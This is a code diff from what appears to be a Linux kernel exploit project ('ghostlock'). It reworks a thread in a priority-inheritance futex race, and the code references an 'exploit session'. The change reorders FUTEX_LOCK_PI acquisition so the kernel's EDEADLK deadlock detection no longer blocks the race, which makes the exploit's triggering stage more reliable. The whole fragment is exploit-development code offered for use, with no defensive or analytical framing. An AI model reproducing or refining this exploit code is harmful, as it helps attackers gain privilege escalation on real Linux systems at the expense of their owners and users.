@@ -75,20 +75,24 @@ namespace ghostlock::race {
     void *owner_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         support::disable_rseq_for_thread();
-        long lock_target = support::futex_op(
-            &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
-        if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
+        /* W1-REWORK WAVE1: owner must NOT hold target_futex while main issues
+         * FUTEX_CMP_REQUEUE_PI at PiRace::run. Holding it pre-park closes the
+         * waiter->target->owner->chain->waiter cycle the kernel flags EDEADLK.
+         * Acquire target_futex only after this thread has committed to blocking
+         * on chain_futex. (docs/development/w1-pifutexrace-rework-plan.md) */
+        long lock_target = -1;
         while (!race->waiter_ready.load() &&
                !race->owner_stop.load())
             usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
         if (race->owner_stop.load()) {
-            if (lock_target == 0)
-                support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
             return nullptr;
         }
         race->owner_started.store(1);
         support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
         race->owner_chain_done.store(1);
+        lock_target = support::futex_op(
+            &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
+        if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
         while (!race->owner_stop.load()) sleep(1);
         if (lock_target == 0)
             support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
